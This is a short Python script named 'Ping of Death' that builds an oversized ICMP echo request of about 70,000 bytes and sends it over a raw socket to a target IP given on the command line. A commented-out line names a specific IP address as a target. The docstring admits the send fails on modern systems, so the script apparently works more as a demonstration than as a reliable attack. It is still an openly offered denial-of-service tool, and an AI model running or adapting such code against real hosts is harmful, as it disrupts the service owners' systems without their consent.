#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
Description:
    Ping of Death

    The error [Errno 90] Message too long occurs because the socket library enforces restrictions on the packet size for raw sockets, and modern operating systems include safeguards against sending oversized packets that violate the protocol's rules.
    Check out ping-of-death-1.py that using another library
"""

import socket
import struct
import sys

class Style:
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    CYAN = '\033[36m'
    RESET = '\033[0m'

style = Style()

def send_pod_attack(target_ip):
    """
    Send oversized ICMP packets to simulate Ping of Death
    """
    #construct an ICMP Echo Request packet
    icmp_type = 8       # echo request
    icmp_code = 0
    icmp_checksum = 0
    icmp_id = 1
    icmp_seq = 1
    header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)

    # Defind an oversized packet, larger than 65534
    # Exceeds maximum allowable size
    payload = b"A" * 70000
    packet = header + payload
    try:
        # Create a raw socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        # Send the packet to the target
        sock.sendto(packet, (target_ip, 0))

        print(style.GREEN + f"Ping of Death packet send to {target_ip}" +
              style.RESET)
    except Exception as e:
        print(style.RED + f"[-]ERROR: {e}" + style.RESET)

def main():
    if len(sys.argv) != 2:
        print(style.YELLOW + "SYNTAX: file-name [target-ip]" + style.RESET)
        return

    #target_ip = "162.210.97.174"
    target_ip = sys.argv[1]
    send_pod_attack(target_ip)

    
if __name__ == "__main__":
    main()

